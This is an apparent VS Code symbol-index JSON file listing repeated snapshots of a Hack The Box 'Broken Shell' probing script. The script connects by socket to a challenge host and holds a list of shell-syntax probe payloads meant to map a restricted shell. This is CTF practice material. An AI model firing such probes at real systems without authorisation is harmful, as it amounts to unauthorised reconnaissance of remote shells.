        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250516222657",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "peekOfCode": "HOST = \"94.237.57.57\"\nPORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "peekOfCode": "PORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517033732",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "peekOfCode": "HOST = \"94.237.57.57\"\nPORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "peekOfCode": "PORT = 51289\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034441",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517034606",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035202",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517035313",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "peekOfCode": "PORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "peekOfCode": "TIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "peekOfCode": "payloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},\n    {\"desc\": \"Simple { (should be syntax error or wait for })\", \"cmd\": \"{\"},\n    {\"desc\": \"Simple } (should be syntax error)\", \"cmd\": \"}\"},\n    {\"desc\": \"Simple / (likely error if not part of path)\", \"cmd\": \"/\"},\n    {\"desc\": \"Simple ? (glob, might list single-char files or error)\", \"cmd\": \"?\"},\n    {\"desc\": \"Simple \\\" (should be syntax error or wait for closing quote)\", \"cmd\": \"\\\"\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517041547",
        "documentation": {}
    },
    {
        "label": "recv_all",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "peekOfCode": "def recv_all(sock, timeout):\n    \"\"\"Receive all data from socket with timeout.\"\"\"\n    sock.settimeout(timeout)\n    total_data = b\"\"\n    while True:\n        try:\n            data = sock.recv(4096)\n            if not data:\n                break\n            total_data += data",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "peekOfCode": "def main():\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print(f\"[*] Connecting to {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] Connected.\")\n        # Receive initial banner\n        initial_banner = recv_all(s, TIMEOUT)\n        print(\"\\n--- Initial Server Banner ---\")\n        try:",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "peekOfCode": "HOST = \"94.237.59.174\"\nPORT = 47959\nTIMEOUT = 3  # seconds for socket operations\n# Payloads to test\n# We'll focus on information disclosure, command structure, and basic operations.\npayloads = [\n    # --- Basic Character Tests & Syntax ---\n    {\"desc\": \"Empty command (just newline)\", \"cmd\": \"\"},\n    {\"desc\": \"Simple number\", \"cmd\": \"0\"},\n    {\"desc\": \"Simple $ (should try to expand nothing or error)\", \"cmd\": \"$\"},",
        "detail": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.HTB-Broken-Shell.Script-1_20250517042050",
        "description": ".history.HTB-Broken-Shell.Script-1_20250517042050",
